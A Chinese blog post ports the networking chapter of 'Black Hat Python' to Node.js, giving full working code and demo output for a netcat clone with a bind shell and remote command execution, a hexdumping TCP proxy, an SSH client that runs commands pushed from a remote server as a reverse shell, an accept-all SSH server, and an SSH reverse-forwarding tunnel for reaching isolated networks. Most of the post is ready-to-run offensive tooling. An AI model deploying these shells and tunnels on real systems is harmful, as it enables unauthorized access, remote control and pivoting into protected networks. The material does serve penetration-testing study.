---
layout: post
title: "Black Hat Javascript"
excerpt: "netcat, tcp proxy, ssh shell in nodejs"
category: javascript
tags: [javascript, security]
disqus: true
---

这天我来到j3，看到斌哥的一本叫做blackhat python的书

看看各位安全界大神们对Python的评价，我觉得。。。好多疑惑

你被攻击机器没有ssh服务器，就有python解释器了？

有python解释器，不还得装上paramiko么。。

到底还是二进制程序最靠谱。。也许能打包吧

最关键的是

> 我觉得Javascript更好啊！

开玩笑，不过nodejs的stream是一个强大的抽象，让我们先用nodejs来第二章网络基础中的  
Python代码吧，体会下什么叫方便好用2333

## TCP/UDP之Client/Server

略过

## netcatJS

这是第一个大一点的练习，作者说不止一次，他进入的机器中没有netcat但是有python  
这确实是python的优势，然而我依然要用node来写一次，既然用node就使用其他语言不  
大有的东西，stream。

Python版本的实现中，IO是阻塞的，在服务器模式时，通过线程来支持多个连接。程序大量  
使用循环和冗杂的数据处理。程序是时间先后导向的。

NodeJS的版本中，IO天生非阻塞，我依靠stream来让程序不至于直接推出，依靠stream来  
添加提示符，写文件等等，在更高的抽象层次上更优雅实现功能。程序是事件驱动数据导向的

值得一提的是，NodeJS中的stream有很多好处的，比如Python那个程序碰到100G的大文件就傻逼了。。。  
所以更好的方式是使用Python中的[流](https://docs.python.org/2/library/io.html)

```javascript
'use strict'
const getopt = require('posix-getopt')
const net = require('net')
const fs = require('fs')
const exec = require('child_process').exec
const spawn = require('child_process').spawn
const util= require('util')
const Transform = require('stream').Transform

let debug = ()=>{}

/*
 * global
 */
let listen = false
let command = false
let upload = false
let execute = ''
let target = ''
let uploadDestination = ''
let port = 0

if (process.argv.length < 3) usage()
/*
 * getopt
 */

let parser = new getopt.BasicParser(
  'h(help)l(listen)e:(execute)t:(target)p:(port)c(command)u:(upload)', 
  process.argv
)


let option
while ((option = parser.getopt()) && !option.error) {
  switch (option.option) {
      case 'h':
          usage()
          process.exit(0)
          break
      case 'l':
          debug('listen')
          listen = true
          break
      case 'e':
          debug('execute')
          execute = option.optarg
          break
      case 't':
          debug('target')
          target = option.optarg
          break
      case 'p':
          debug('port')
          port = parseInt(option.optarg)
          break
      case 'c':
          debug('command')
          command = true
          break
      case 'u':
          debug('upload')
          uploadDestination = option.optarg
          break
      default:
          break
  }
}

/* 
 * connect
 */
if (!listen && target.length && port > 0) {
  let client = net.connect({host: target, port: port}, () => {
    debug(`connect to ${target}:${port}`)
  })
  process.stdin.pipe(client)
  client.pipe(process.stdout)
  client.on('error', (e) => {
    console.error(e)
    process.exit(e)
  })
  client.on('end', (e) => {
    process.exit(0)
  })
}

/*
 * listen
 */

if (listen) {
  if (!target) {
    target = '0.0.0.0'
  }
  net.createServer((c) => {
    /*
     * upload
     */
    if (uploadDestination) {
      let f = fs.createWriteStream(uploadDestination)
      c.pipe(f)
    }

    /*
     * execute
     */
    if (execute) {
      exec(execute, (err, stdout, stderr) => {
        c.write(stdout)
        c.write(stderr)
        c.end()
      })
    }

    /*
     * command
     */
    if (command) {
      c.write('<netcatJS:#>')
      let sh = spawn('/bin/bash', [], {
        //detached: true,
      })
      let prompt = new Transform({
        transform: function(chunk, encoding, next) {
          this.push(chunk + '<netcatJS:#>');
          next();
        },
        flush: function(done) {
          done();
        }
      });
      sh.stdout.pipe(prompt).pipe(c)
      c.pipe(sh.stdin)
      c.on('end', () => {
        sh.kill()
      })
    }
  })
  .listen(port)
  .on('error', (e) => {
    console.error(e)
    process.exit(1)
  })
}

/*
 * usage
 */
function usage(){
  console.log(
    `
    netcatJS

    Usage: netcatjs -t target_host -p port
    -l --listen                 - listen on [host]:[port] for incoming connections
    -e --execute=file_to_run    - execute the given file upon receiving a connection
    -c --command                - initialize a command shell
    -u --upload=destination     - upon receiving connection upload a file and write to [destination]

    Examples:
    netcatjs -t 192.168.0.1 -p 5555 -l -c
    netcatjs -t 192.168.0.1 -p 5555 -l -u "c:\\\\target.exe"
    netcatjs -t 192.168.0.1 -p 5555 -l -e "cat /etc/passwd"
    echo 'ABCDEFGHI' | netcatjs -t 192.168.0.1 -p 135
    `)
  process.exit(0)
}
```

使用

```bash
# 连接本机8000端口
➜  netcatjs node index -t localhost -p 8000  
hello
╭─[~/tmp/netcatjs]─[reverland@reverland-R478-R429]─[0]─[10001]
╰─[:)] % nc -lvp 8000
Listening on [0.0.0.0] (family 0, port 8000)
Connection from [127.0.0.1] port 8000 [tcp/*] accepted (family 2, sport 41574)
hello

# 监听8000并为连入连接开启shell
➜  netcatjs node index -t 127.0.0.1 -p 8000 -l -c
╭─[~/tmp/netcatjs]─[reverland@reverland-R478-R429]─[0]─[10002]
╰─[:)] % nc localhost 8000
<netcatJS:#>id
uid=1000(reverland) gid=1000(reverland) groups=1000(reverland),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),127(wireshark)

# 监听8000并将监听的输入保存到文件aFile中
➜  netcatjs node index -t 127.0.0.1 -p 8000 -l --upload=./aFile
╭─[~/tmp/netcatjs]─[reverland@reverland-R478-R429]─[0]─[10009]
╰─[:)] % echo ABCDE| nc localhost 8000
## stop server
➜  netcatjs cat ./aFile 
ABCDE

# 监听8000将id命令结果传回连入连接
➜  netcatjs node index -t 127.0.0.1 -p 8000 -l -e "id"
╭─[~/tmp/netcatjs]─[reverland@reverland-R478-R429]─[0]─[10011]
╰─[:)] % nc localhost 8000
uid=1000(reverland) gid=1000(reverland) groups=1000(reverland),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),127(wireshark)
```

## 一个TCP代理

作者说，你经常没有wireshark用，但Python到处都是。他经常部署简单的TCP代理以了解未知  
协议，修改发送的数据包，或者为模糊测试创建一个测试环境

我个大傻逼想了想，Javascript也很适合啊，就算没有，我们用python下载下来一个Nodejs。。。

本书中Python的实现，还是以事件发生先后顺序即以时间为轴进行编程，于是就看到了  
冗杂的接受和发送过程。不是很清楚Python里stream这种东西怎样，  
也许可以看看[eyalarubas的文章](http://eyalarubas.com/python-subproc-nonblock.html)

JS版本就清爽很多，因为js程序的是围绕数据设计的，依托stream这种抽象，我们可以  
方便的记录、修改传递数据。而不用过多关心我先把数据传给谁再传给谁的问题。而且，  
这不到100行程序并不比Python程序功能少，而且可以少一个判断是否先接收服务器返回的参数。  
怎么看都觉得stream是优雅的。

hexdump的代码没什么难度，就是计算位置的时候我就开始撞大运编程了。。。

```javascript
'use strict'
const net = require('net')
const Transform = require('stream').Transform
const PassThrough = require('stream').PassThrough

if (process.argv.length != 6) {
  console.log(
    `
    Usage: proxyjs [localhost] [localport] [remotehost] [remoteport]
    Example: proxyjs 127.0.0.1 9000 123.125.114.144 80
    `
  )
  process.exit(0)
}

let localHost = process.argv[2]
let localPort = process.argv[3]
let remoteHost = process.argv[4]
let remotePort = process.argv[5]

net.createServer((c) => {

  let logReq = new PassThrough()
  let logRes = new PassThrough()
  logReq.on('data', recordReq)
  logRes.on('data', recordRes)
  let requestTransform = new Transform({
    // 不能写成=>
    transform: function(chunk, encoding, next) {
      this.push(chunk)
      next()
    },
    flush: function(done) {
      done()
    }
  })

  let responseTransform = new Transform({
    // 不能写成=>这里有坑哈哈哈
    transform: function(chunk, encoding, next) {
      this.push(chunk)
      next()
    },
    flush: function(done) {
      done()
    }
  })

  console.log(`[==>]Received incoming connection from${c.address().address}:${c.address().port}`)
  let remote = net.connect(remotePort, remoteHost, ()=>{})
  c.pipe(logReq)
  .pipe(requestTransform)
  .pipe(remote)
  .pipe(responseTransform)
  .pipe(logRes)
  .pipe(c).on('error', (e)=>{
    console.error(e)
    remote.end()
  })

  remote.on('error', (e)=>{
    console.error(e)
    c.end()
  })
}).listen({
  host: localHost,
  port: localPort
})

console.log(`[*] Listening on ${localHost}:${localPort}`)

function hexdump(buf) {
  let hex = buf.toString('hex')
  for (let i = 0; i < hex.length; i += 2) {
    if (i % 32 == 0) {
      // offset
      let hexRepresent= (i / 2).toString(16)
      let offset = hexRepresent.length < 6 ? Array(6 - hexRepresent.length).fill('0').join('') + hexRepresent: hexRepresent;
      process.stdout.write(`${offset}\t`)
    }
    process.stdout.write(`${hex.slice(i, i+2)} `)
    if (i % 32 == 30 || i >= (hex.length - 2)) {
      if (i >= (hex.length - 2)) {
        // what a fuck calculating offsets here
        process.stdout.write(Array((32 - (i % 32)) / 2 - 1).fill('   ').join(''))
      }
      let asciiLine = Array.from(buf.slice(i / 2 - ((i / 2) % 16), i / 2 + 1)).map( (n) => {
        if (n > 127 || n < 33) 
          return '.'
        else 
          return String.fromCharCode(n)
      }).join('')
      process.stdout.write(` ${asciiLine}\n`)
    }
  }
}

function recordReq(chunk) {
  console.log(`[==>] Received ${chunk.length} bytes from ${localHost}:${localPort}`)
  hexdump(chunk)
}

function recordRes(chunk) {
  console.log(`[<==] Sending ${chunk.length} bytes to ${remoteHost}:${remotePort}`)
  hexdump(chunk)
}
```

使用

```javascript
╭─[~/tmp/proxyjs]─[reverland@reverland-R478-R429]─[0]─[10035]
╰─[:)] % node index.js 127.0.0.1 9000 123.125.114.144 80
[*] Listening on 127.0.0.1:9000
[==>]Received incoming connection from127.0.0.1:9000
[==>] Received 15 bytes from 127.0.0.1:9000
000000	47 45 54 20 2f 20 48 54 54 50 2f 31 2e 30 0a     GET./.HTTP/1.0.
[==>] Received 1 bytes from 127.0.0.1:9000
000000	0a                                               .
[<==] Sending 381 bytes to 123.125.114.144:80
000000	48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d  HTTP/1.1.200.OK.
000010	0a 44 61 74 65 3a 20 57 65 64 2c 20 30 39 20 4d  .Date:.Wed,.09.M
000020	61 72 20 32 30 31 36 20 30 39 3a 32 30 3a 34 37  ar.2016.09:20:47
000030	20 47 4d 54 0d 0a 53 65 72 76 65 72 3a 20 41 70  .GMT..Server:.Ap
000040	61 63 68 65 0d 0a 4c 61 73 74 2d 4d 6f 64 69 66  ache..Last-Modif
000050	69 65 64 3a 20 54 75 65 2c 20 31 32 20 4a 61 6e  ied:.Tue,.12.Jan
000060	20 32 30 31 30 20 31 33 3a 34 38 3a 30 30 20 47  .2010.13:48:00.G
000070	4d 54 0d 0a 45 54 61 67 3a 20 22 35 31 2d 34 37  MT..ETag:."51-47
000080	63 66 37 65 36 65 65 38 34 30 30 22 0d 0a 41 63  cf7e6ee8400"..Ac
000090	63 65 70 74 2d 52 61 6e 67 65 73 3a 20 62 79 74  cept-Ranges:.byt
0000a0	65 73 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67  es..Content-Leng
0000b0	74 68 3a 20 38 31 0d 0a 43 61 63 68 65 2d 43 6f  th:.81..Cache-Co
0000c0	6e 74 72 6f 6c 3a 20 6d 61 78 2d 61 67 65 3d 38  ntrol:.max-age=8
0000d0	36 34 30 30 0d 0a 45 78 70 69 72 65 73 3a 20 54  6400..Expires:.T
0000e0	68 75 2c 20 31 30 20 4d 61 72 20 32 30 31 36 20  hu,.10.Mar.2016.
0000f0	30 39 3a 32 30 3a 34 37 20 47 4d 54 0d 0a 43 6f  09:20:47.GMT..Co
000100	6e 6e 65 63 74 69 6f 6e 3a 20 43 6c 6f 73 65 0d  nnection:.Close.
000110	0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a 20 74  .Content-Type:.t
000120	65 78 74 2f 68 74 6d 6c 0d 0a 0d 0a 3c 68 74 6d  ext/html....<htm
000130	6c 3e 0a 3c 6d 65 74 61 20 68 74 74 70 2d 65 71  l>.<meta.http-eq
000140	75 69 76 3d 22 72 65 66 72 65 73 68 22 20 63 6f  uiv="refresh".co
000150	6e 74 65 6e 74 3d 22 30 3b 75 72 6c 3d 68 74 74  ntent="0;url=htt
000160	70 3a 2f 2f 77 77 77 2e 62 61 69 64 75 2e 63 6f  p://www.baidu.co
000170	6d 2f 22 3e 0a 3c 2f 68 74 6d 6c 3e 0a           m/">.</html>.
reverland@reverland-R478-R429 ~/tmp/proxyjs
  % nc localhost 9000                                                    !10036
GET / HTTP/1.0

HTTP/1.1 200 OK
Date: Wed, 09 Mar 2016 09:20:47 GMT
Server: Apache
Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT
ETag: "51-47cf7e6ee8400"
Accept-Ranges: bytes
Content-Length: 81
Cache-Control: max-age=86400
Expires: Thu, 10 Mar 2016 09:20:47 GMT
Connection: Close
Content-Type: text/html

<html>
<meta http-equiv="refresh" content="0;url=http://www.baidu.com/">
</html>
```

## 使用ssh加密连接

这部分有两个重要的例子。

*   一个是ssh客户端反向连接服务器端并打开一个客户端机器的shell
*   一个是ssh转发代理.

书中Python的实现使用了Paramiko库，作为对比，nodejs有ssh2。我觉得  
Nodejs提供的抽象让人远离了冗杂的数据操作,站在数据流动的角度思考问题。  
但，也没Python那样直观和一目了然了。

首先，需要生成服务器私钥，也就是host key

```bash
reverland@reverland-R478-R429 ~/tmp/sshjs
  % ssh-keygen -t rsa                                                    !10039
Generating public/private rsa key pair.
Enter file in which to save the key (/home/reverland/.ssh/id_rsa): host.key
host.key already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in host.key.
Your public key has been saved in host.key.pub.
The key fingerprint is:
cc:e3:2e:65:3d:5c:58:17:2b:62:bd:9a:30:38:38:bf reverland@reverland-R478-R429
The key's randomart image is:
+--[ RSA 2048]----+
|              .. |
|           .. .. |
|          ooo..  |
|     . + ....o   |
|    o o So ..    |
|     o oo++o     |
|      .o. o.     |
|      .o         |
|      E..        |
+-----------------+
```

这时候目录下应该还会多了一个`host.key.pub`，这是公钥

首先，我们来实现sshcmd.js，客户端。客户端连接ssh服务器，  
建立连接，  
接收ssh服务器响应的命令并执行  
执行结果写入连接，并附上提示符等待下一个命令

```bash

	

'use strict'
const Client = require('ssh2').Client
const exec = require('child_process').exec
const fs = require('fs')

sshCommand('127.0.0.1', 2222, 'root', '123456', 'clientConnected')

function sshCommand(ip, port, user, passwd, command) {
  let conn = new Client()
  conn.on('ready', () => {
    console.log(`Connected to ${ip}:${port}`)
    conn.exec(command, (err, stream) => {
      if (err) throw err;
      stream.on('close', (code, signal) =>{
        console.log(`Disconnected from ${ip}:${port}`)
        conn.end()
      })
      let cmd
      stream.on('data', (thunk)=>{
        cmd = thunk
        if (cmd) {
          let ps = exec(cmd, (error, stdout, stderr) => {
            if (error) console.error(err);
            stream.write(stdout)
            stream.write(stderr)
            stream.write('Command> ')
          })
        }
      })
    })
  }).connect({
    host: ip,
    port: port,
    username: user,
    password: passwd,
  })
}
```

接着是服务器端，看看我们的server多简单，

关于ssh2 的一个小细节，npm上ssh2还是0.4，createServer时还应该用privateKey而不是hostKeys，

```javascript
'use strict'

const fs = require('fs')
const inspect = require('util').inspect
const ssh2 = require('ssh2')

new ssh2.Server({
  //hostKeys: [fs.readFileSync('host.key.pub')],
  privateKey: fs.readFileSync('host.key').toString()
}, function(client) {
  let peername = client._sock._peername
  console.log(`${peername.address}:${peername.port} connected!`)

  client.on('authentication', function(ctx) {
      ctx.accept()
  }).on('ready', function() {
    //console.log('Client authenticated!')

    client.on('session', function(accept, reject) {
      var session = accept()
      session.on('exec', function(accept, reject, info) {
        console.log(inspect(info.command))
        var stream = accept()
        process.stdout.write(`Command> `)
        process.stdin.pipe(stream)
        stream.pipe(process.stdout)
      })
    })
  }).on('end', function() {
    console.log(`${peername.address}:${peername.port} disconnected!`)
  })
}).listen(2222, '127.0.0.1', function() {
  console.log('Listening on port ' + this.address().port)
})
```


可以参看对比下到处while、try的Python代码，  
虽然我没判断exit命令，但就是在`sshcmd.js`里加个判断的事

使用如下

```javascript
#客户端
reverland@reverland-R478-R429 ~/tmp/sshjs
  % node sshcmd.js                                                       !10045
Connected to 127.0.0.1:2222

# 服务器端
10045 ◯  node sshserver.js 
Listening on port 2222
127.0.0.1:55292 connected!
'clientConnected'
Command> id   
uid=1000(reverland) gid=1000(reverland) groups=1000(reverland),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),127(wireshark)
Command> whoami
reverland
Command>
```

最后实现一个ssh加密的转发反向代理`sshrforward.js`。和书中场景一样。ssh client反向连接ssh server  
该server就把本地某个端口与ssh client连接起来，所有通过这个端口的请求  
都经过ssh client转发给与ssh同在目标网络的web服务器。反之，所有web服务器的返回  
经由ssh client传递给ssh server的该端口。

本书中的Python实现可谓丧心病狂，除了把线程用上，还开始在python中写  
底层的select。看上去不长，但命令行解析部分省略了，其实不短

好在我们有nodejs，异步IO非阻塞。Commander用来方便解析命令行参数  
mutableStream用来让密码不至于随着输入显示，  
除去这些一堆花样，剩下的几行就是简单的ssh转发

```javascript
'use strict'
const Client = require('ssh2').Client
const program = require('commander')
const readline = require('readline')
const inspect = require('util').inspect
const Writable = require('stream').Writable
const net = require('net')

var mutableStdout = new Writable({
  write: function(chunk, encoding, callback) {
    if (!this.muted)
      process.stdout.write(chunk, encoding)
    callback()
  }
})

// 把password 打印出来
mutableStdout.muted = false

const rl = readline.createInterface({
  input: process.stdin,
  output: mutableStdout,
  terminal: true
})

parseOptions()

function parseOptions() {
  program
  .version('0.0.1')
  .option('-p, --port <port>', 'server port to bind to')
  .option('-r, --remote <host>', "remote host to connect to")
  .option('-u, --username <username>', "username")
  .option('-P, --password', "password")
  .parse(process.argv)

  if (!program.args.length) {
    program.help()
  }
  let serverHost = program.args[0].split(':')[0]
  let serverPort = program.args[0].split(':')[1] || 22
  let bindPort = program.port
  let remoteHost = program.remote.split(':')[0]
  let remotePort = program.remote.split(':')[1] || 80
  let username = program.username
  if (program.password) {
    rl.question('password: ', (text) => {
      let password = text.trim()
      var options = {
        server: serverHost,
        serverPort: serverPort,
        serverBindPort: bindPort,
        remote: remoteHost,
        remotePort: remotePort,
        username: username,
        password: password,
      }
      sshrforward(options);
    })
    // 让输入的密码打印不出来，createInterface时必须terminal: true(isTTY)
    mutableStdout.muted = true
  }
}
function sshrforward(options) {
  //console.log(inspect(options))
  var conn = new Client()
  console.log(`\nConnecting to ssh host ${options.server}:${options.serverPort}`)
  conn.on('ready', function() {
    console.log(`Now forwarding remote port ${options.serverBindPort} to ${options.remote}:${options.remotePort}`)
    conn.forwardIn(options.server, options.serverBindPort, function(err) {
      if (err) throw err;
      console.log(`Listening for connections on server on port ${options.serverBindPort}!`)
    })
  }).on('tcp connection', function(info, accept, reject) {
    // console.dir(info)
    let stream = accept();
    let conn = net.connect(options.remotePort, options.remote, () => {
      console.log(`Connected! Tunnel open ${info.srcIP}:${info.srcPort} -> ${options.server}:${options.serverBindPort} -> ${options.remote}:${options.remotePort}`)
      stream.pipe(conn).pipe(stream).on('error', (e) => {
        console.error(e)
        conn.end()
      })
    })
    conn.on('error', (e) => {
      console.error(e)
      stream.end()
    })
  }).connect({
    host: options.server,
    port: options.serverPort,
    username: options.username,
    password: options.password
  })
}
```

使用也很明了，假设sshrforward.js所在机器与百度在同一个目标网络，而ssh服务器所在的网络是隔绝的，  
那么如将百度(180.149.132.47:80)绑定到ssh服务器8000端口，ssh服务器就可以通过8000端口经由sshrforward.js所在的机器连接百度

```bash
# sshrforward.js
reverland@reverland-R478-R429 ~/tmp/sshjs
  % node sshrforward.js 127.0.0.1 -p 8000 -r 180.149.132.47:80 --username=reverland --password
password: 
Connecting to ssh host 127.0.0.1:22
Now forwarding remote port 8000 to 180.149.132.47:80
Listening for connections on server on port 8000!
Connected! Tunnel open 127.0.0.1:43048 -> 127.0.0.1:8000 -> 180.149.132.47:80

# 在ssh server上
reverland-R478-R429 ॐ  ~/tmp/sshjs:
10054 ◯  nc localhost 8000
GET / HTTP/1.0

HTTP/1.1 200 OK
Date: Wed, 09 Mar 2016 10:05:07 GMT
Server: Apache
Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT
ETag: "51-47cf7e6ee8400"
Accept-Ranges: bytes
Content-Length: 81
Cache-Control: max-age=86400
Expires: Thu, 10 Mar 2016 10:05:07 GMT
Connection: Close
Content-Type: text/html

<html>
<meta http-equiv="refresh" content="0;url=http://www.baidu.com/">
</html>
```

在两台机器上能看得更清楚，如果只有一台机器。  
这个8000端口并不能用`lsof -i :8000`的方法看到  
却可以通过`netstat -ltnp`来看到，查看进程开的端口`netstat -nap | pgrep "node|ssh"`  
也不能看到这个端口，所以，大概和ssh的22端口一样是ssh莫名开的吧2333

其他程序启动的8000端口不具有这个特性。

至此，第二章完结。

我想对每个渗透测试人员说，既然能用python，那为啥不能用python下载个nodejs？

哈哈哈

游泳去了，也许会写写接下来第三章的扫描器
